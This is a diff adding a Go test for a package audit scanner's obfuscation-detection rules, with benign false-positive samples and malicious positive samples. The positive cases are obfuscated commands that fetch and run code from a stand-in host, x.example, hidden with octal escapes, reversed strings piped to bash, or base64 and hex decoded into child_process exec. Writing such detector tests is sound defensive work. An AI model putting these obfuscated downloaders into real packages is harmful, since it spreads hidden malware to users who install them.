@@ -78,3 +78,30 @@ func TestAuditAntiForensicsNeedsAClear(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// Obfuscation rules fired on terminal escapes, a missing word boundary and calls that encode.
+func TestAuditObfuscationNeedsDecodeAndRun(t *testing.T) {
+	neg := []ruleCase{
+		{"P-OCTAL-ENCODE", "aur", `echo -e "\033[1;31mWarning: Version mismatch!\033[0m" || echo -e "Electron version: \033[1;32m$_v\033[0m"`},
+		{"P-OCTAL-ENCODE", "packagist", `return self::make('printf \'\377\330\377\340JPEGSTUB\' > "$out"');`},
+		{"P-OCTAL-ENCODE", "cargo", `printf '\036\037ghist\naaaa\000aaaa\000\000\000A\000a\000date\000'`},
+		{"P-OCTAL-ENCODE", "npm", `printf '%s' "$1" | tr -d '\042\047\134' | tr '\n' ' '`},
+		{"P-OCTAL-ENCODE", "go", `"printf '\\115\\101\\107\\117",              // MAGO`},
+		{"P-REV-EXEC", "packagist", `tramite SHA-256 nella forma <code>self = sha256(prev || ':' || sha)</code>.`},
+		{"P-REV-EXEC", "pypi", `if sep in ("|", "|&") and prev is not None:  # echo 'git push' | sh`},
+		{"P-JS-CHILDPROC-DECODE", "npm", `child_process_1.execSync.mockReturnValue(Buffer.from(""));`},
+		{"P-JS-CHILDPROC-DECODE", "npm", `const m = /^offset:(\d+)$/.exec(Buffer.from(cursor, "base64url").toString("utf-8"));`},
+		{"P-JS-CHILDPROC-DECODE", "npm", `executor.input.ExclusiveStartKey = JSON.parse(Buffer.from(result.next, 'base64').toString());`},
+		{"P-JS-CHILDPROC-DECODE", "npm", `const run = spawnSync('pwsh.exe', ['-NoLogo', '-NoProfile', '-NonInteractive', '-EncodedCommand', Buffer.from(wmiCreate, 'utf16le').toString('base64')], { input, encoding: 'utf8' });`},
+		{"P-JS-CHILDPROC-DECODE", "go", "{regexp.MustCompile(`\\beval\\s*\\(\\s*atob\\s*\\(`), \"obfuscated_exec\", \"destructive\", \"eval(atob(...)) obfuscated execution\"},"},
+	}
+	pos := []ruleCase{
+		{"P-OCTAL-ENCODE", "npm", `eval "$(printf '\143\165\162\154\040\150\164\164\160')"`},
+		{"P-OCTAL-ENCODE", "npm", `printf '\143\165\162\154 -s x.example/p' | sh`},
+		{"P-REV-EXEC", "npm", `echo 'hs.p/elpmaxe.x//:ptth Ls- lruc' | rev | bash`},
+		{"P-JS-CHILDPROC-DECODE", "npm", `require("child_process").execSync(Buffer.from("Y3VybCBodHRwOi8veC5leGFtcGxl", "base64").toString())`},
+		{"P-JS-CHILDPROC-DECODE", "npm", `exec(atob("Y3VybCBodHRwOi8veC5leGFtcGxl"))`},
+		{"P-JS-CHILDPROC-DECODE", "npm", `(0, child_process_1.spawn)('sh', ['-c', Buffer.from(cmd, 'hex').toString()])`},
+	}
+	checkRuleCases(t, neg, pos)
+}
